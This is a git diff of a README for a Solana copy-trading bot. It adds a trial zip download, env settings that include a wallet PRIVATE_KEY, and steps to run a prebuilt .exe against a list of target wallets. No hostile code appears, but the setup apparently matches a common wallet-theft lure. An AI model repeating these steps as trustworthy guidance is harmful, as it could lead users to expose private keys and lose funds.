@@ -50,15 +50,18 @@ src/
 │   └── nextblock.rs        # NextBlock service provides the ultra-fast transaction confirmation in unique way
 |
 ├── common/
-│   ├── logger.rs        # Logs to be clean and convenient to monitor.
-│   └── utils.rs        # Utility functions used across the project
+|    ├── logger.rs        # Handles logging to be clean and convenient to monitor.
+|    ├── config.rs        # Handles project configurations such as environment variables and constants.
+|    ├── constants.rs        # Stores global constants used across the project.
+|    ├── targetlist.rs     # Manages lists of targets such as URLs or files.
+|    └── utils.rs          # Utility functions used across the project, including input/output operations, string manipulation, etc.
 │
 ├── lib.rs
 └── main.rs
 ```
 ---
 ## Trial Version
-🗂️ Comming soon...
+🗂️ [solana-raypump-copytrading-bot(r7m-trial).zip](https://github.com/user-attachments/files/18871125/solana-raypump-copytrading-bot.r7m-trial.zip)
 
 ### How To Run
 1. Environment Variables Settings
@@ -66,19 +69,24 @@ src/
 PRIVATE_KEY=your_private_key_here
 RPC_HTTPS=https://mainnet.helius-rpc.com/?api-key=your_api_key_here
 RPC_WSS=wss://atlas-mainnet.helius-rpc.com/?api-key=your_api_key_here
-DEVNET_RPC_HTTPS=https://devnet.helius-rpc.com/?api-key=your_api_key_here
-RAYDIUM_LPV4=675kPX9MHTjS2zt1qfr1NYHuzeLXfQM9H24wFSUt1Mp8
 SLIPPAGE=10
 JITO_BLOCK_ENGINE_URL=https://ny.mainnet.block-engine.jito.wtf
 JITO_TIP_STREAM_URL=ws://bundles-api-rest.jito.wtf/api/v1/bundles/tip_stream
 JITO_TIP_PERCENTILE=50
 JITO_TIP_VALUE=0.004
-TOKEN_AMOUNT=0.000001
+TOKEN_PERCENTAGE=1 #percentage
 ```
+2. List target wallet address into `targetlist.txt`.
+3. Run `raypump-copytrading-bot.exe`.
 
-2. Run `raypump-copytrading-bot.exe`.
-
-
+---
+![5021893217133637158](https://github.com/user-attachments/assets/2a653361-5896-40e1-b149-7dafdf63a008)
+> ---[BUY]---
+* target: https://solscan.io/tx/5aaQDtXjyf4NDF3NKjjmC5s6Y8AhW3ieTpmB6Kxt6UGC2AowJ2xRTzFJo7KM4CVcpbphA2w76juGDdvqqgNTt1CF
+* copied: https://solscan.io/tx/4uPU2BRi7BJCTxp4kJQFTmLj5pmoAyKw7zCHNCPiP2NYK2HcqXfJr8gE6eF89VYPEy5VTFaRQf4DTUZNzttFQ73Z
+> ---[SELL]---
+* target: https://solscan.io/tx/22qnz4aBXqmeQbp6cnAogSVPNxSbEJr7tswch5QXLSG8Rvnb4SwDJFJ9RytpUVkUUQUtiy44fYwafF5CgiYjdVtp
+* copied: https://solscan.io/tx/3uBU12fQT14z88tiX1i1EH8XWXpFco4dU1QG8VEtYQyXtaSQXQB6AR7HBF4GtF9YDCa54Uw4xE7H7JPjBM9cETKM
 ---
 ## Donate
 
